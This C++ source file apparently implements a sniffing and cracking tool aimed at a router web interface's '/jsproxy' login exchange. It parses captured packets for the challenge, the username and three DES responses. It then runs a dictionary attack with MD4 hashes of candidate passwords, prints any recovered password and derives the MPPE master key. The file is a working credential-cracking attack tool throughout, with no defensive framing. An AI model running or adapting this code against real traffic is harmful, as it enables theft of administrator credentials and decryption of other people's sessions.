#include "session_parser.hpp"

#include <iostream>
#include <iomanip>
#include <cstring>
#include <string>
#include <fstream>
#include <stdexcept>

#include "md4.hpp"
#include "des.hpp"
#include "sha1.hpp"

namespace
{
    /*
     * Find the \r\n\r\n that denotes the end of the HTTP header and move the
     * provided string to just passed that location
     */
    bool moveToPayload(std::string& p_packet)
    {
        std::size_t offset = p_packet.find("\r\n\r\n");
        if (offset == std::string::npos) {
            return false;
        }
        p_packet.erase(0, offset + 4);
        return true;
    }

    /*
     * A c++ version of javascript's codePointAt. Only supports the two byte
     * version. Also, incremented index so that the caller can track how many
     * bytes were consumed (0, 1, or 2).
     */
    boost::uint8_t codePointAt(const std::string& p_seq, std::size_t& index)
    {
        char c1 = p_seq[index];
        if (c1 & 0x80) {
            if ((c1 & 0xf0) != 0xc0) {
                throw std::runtime_error("Unhandled unicode size");
            }
            if ((index + 1) >= p_seq.length()) {
                throw std::runtime_error("Not enough data in the string");
            }
            index++;
            if ((c1 & 0x0f) <= 2) {
                return p_seq[index++];
            }
            return p_seq[index++] | (1 << ((c1 & 0x0f) - 1 + 4));
        }
        index++;
        return c1;
    }

    void printHexString(const std::string& p_string, bool p_endl=true)
    {
        for (std::size_t i = 0; i < p_string.length(); ++i) {
            std::cout << std::hex << std::setw(2) << std::setfill('0')
                      << (static_cast<boost::uint32_t>(p_string[i]) & 0xff);
        }
        if (p_endl) {
            std::cout << std::endl;
        }
    }

    std::string makeDESKey(const std::string& p_hash, std::size_t j)
    {
        std::string retVal;
        for(std::size_t i = j; i < (j + 56); i += 7) {
            uint16_t w = p_hash[i >> 3];
            w <<= 8;
            w |= (p_hash[(i >> 3) + 1] & 0xff);
            retVal.push_back((w >> (8 - (i & 7))) & 0xfe);
        }
        return retVal;
    }

    bool isPwdHash(const std::string& p_hash, const std::string p_challengeHash,
                   const std::string& p_enc1, const std::string& p_enc2,
                   const std::string& p_enc3)
    {
        std::string paddedHash(p_hash);
        paddedHash.resize(24, 0);

        std::string encrypted;

        // first des key
        std::string desKey1(makeDESKey(paddedHash, 0));
        DES::des(p_challengeHash, desKey1, encrypted);
        if (encrypted != p_enc1) {
            return false;
        } else {
            encrypted.clear();
        }

        // second des key
        std::string desKey2(makeDESKey(paddedHash, 56));
        DES::des(p_challengeHash, desKey2, encrypted);
        if (encrypted != p_enc2) {
            return false;
        } else {
            encrypted.clear();
        }

        // third des key
        std::string desKey3(makeDESKey(paddedHash, 56 * 2));
        DES::des(p_challengeHash, desKey3, encrypted);
        return encrypted == p_enc3;
    }
}

SessionParser::SessionParser() :
    m_serverAddress(),
    m_state(k_none),
    m_username(),
    m_lchallenge(),
    m_rchallenge(),
    m_response(),
    m_response1(),
    m_response2(),
    m_response3(),
    m_passwords()
{
}

SessionParser::~SessionParser()
{
}

bool SessionParser::loadPasswords(const std::string& p_passwordsPath)
{
    std::ifstream passFile(p_passwordsPath);
    if (!passFile.is_open()) {
        std::cerr << "Failed to open " << p_passwordsPath << std::endl;
        return false;
    }

    std::cout << "[+] Loading passwords..." << std::endl;
    std::string password;
    while (std::getline(passFile, password)) {
        if (!password.empty()) {
            m_passwords.push_back(password);
        }
    }

    std::cout << "[+] Passwords loaded: " << m_passwords.size() << std::endl;
    return true;
}

void SessionParser::parse(const boost::uint8_t* p_data, boost::uint16_t p_length, boost::uint32_t p_srcAddr)
{
    switch(m_state) {
        case k_none:
            if (p_length > 13 && memcmp(p_data, "POST /jsproxy", 13) == 0) {
                std::cout << "[+] Initial request found." << std::endl;
                m_state = k_request;
            }
            break;
        case k_request:
            if (p_length > 17 && memcmp(p_data, "HTTP/1.1 200 OK\r\n", 17) == 0) {
                std::cout << "[+] Server challenge received." << std::endl;
                m_serverAddress = p_srcAddr;
                std::string packet;
                packet.assign(reinterpret_cast<const char*>(p_data), p_length);
                if (moveToPayload(packet) && packet.length() > 32) {
                    std::size_t index = 0;
                    for (std::size_t i = 0; i < 24 && index < packet.length(); i++) {
                        if (i < 8) {
                            codePointAt(packet, index);
                        } else {
                            m_rchallenge.push_back(codePointAt(packet, index));
                        }
                    }
                }
                m_state = k_challenge;
            }
            break;
        case k_challenge:
        {
            if (p_length < 13 || memcmp(p_data, "POST /jsproxy", 13) != 0) {
                break;
            }

            std::cout << "[+] Challenge response found." << std::endl;
            m_state = k_done;

            std::string packet;
            packet.assign(reinterpret_cast<const char*>(p_data), p_length);
            if (!moveToPayload(packet)) {
                std::cerr << "Failed to find the payload." << std::endl;
                break;
            }
            std::size_t index = 0;
            for (std::size_t i = 0; i < 26; i++) {
                codePointAt(packet, index);
            }
            m_lchallenge.assign(packet.data() + index, 16);
            index += 16;
            for (std::size_t i = 0; i < 8; i++) {
                codePointAt(packet, index);
            }
            for (std::size_t i = 0; i < 8 && index < packet.length(); i++) {
                m_response1.push_back(codePointAt(packet, index));
            }
            for (std::size_t i = 0; i < 8 && index < packet.length(); i++) {
                m_response2.push_back(codePointAt(packet, index));
            }
            for (std::size_t i = 0; i < 8 && index < packet.length(); i++) {
                m_response3.push_back(codePointAt(packet, index));
            }
            m_response.assign(m_response1);
            m_response.append(m_response2);
            m_response.append(m_response3);
            m_username.assign(packet.data() + index, packet.length() - index);
            std::cout << "Username: " << m_username << std::endl;

            // create the challenge hash
            std::string challenge(m_lchallenge);
            challenge.append(m_rchallenge);
            challenge.append(m_username);
            unsigned char result[20] = { 0 };
            sha1::calc(challenge.data(), challenge.size(), result);
            std::string challengeHash((char*)result, 20);
            challengeHash.resize(8);

            // retrieve the pwdhash from our 3 keys
            bool found = false;
            std::string pwdHash;
            for (std::size_t i = 0; i < m_passwords.size() && !found; i++) {
                std::string password;
                const std::string& temp(m_passwords[i]);

                // insert 0's between each char
                for (std::size_t j = 0; j < temp.size(); j++) {
                    password.push_back(temp[j]);
                    password.push_back(0);
                }

                // verify that this password gens the correct DES strings
                pwdHash.assign(MD4::md4(password));
                if (isPwdHash(pwdHash, challengeHash, m_response1, m_response2, m_response3)) {
                    std::cout << "Password: " << password << std::endl;
                    found = true;
                } else {
                    pwdHash.clear();
                }
            }

            if (!found) {
                std::cout <<"[-] The password is not in the password list." << std::endl;
                return;
            }
            // create the pwd hash hash for master key creation
            std::string pwdHashHash(MD4::md4(pwdHash));
            std::cout << "Password Hash Hash: ";
            printHexString(pwdHashHash);

            // create the master key
            std::string masterKey(pwdHashHash);
            masterKey.append(m_response);
            masterKey.append("This is the MPPE Master Key");

            unsigned char sharesult[20] = { 0 };
            sha1::calc(masterKey.data(), masterKey.size(), sharesult);
            masterKey.assign((char*)sharesult, 16);
            std::cout<< "Master Key: ";
            printHexString(masterKey);
        }
            break;
        case k_challenge_response:
        case k_decrypt:
        case k_done:
        default:
            break;
    }
}

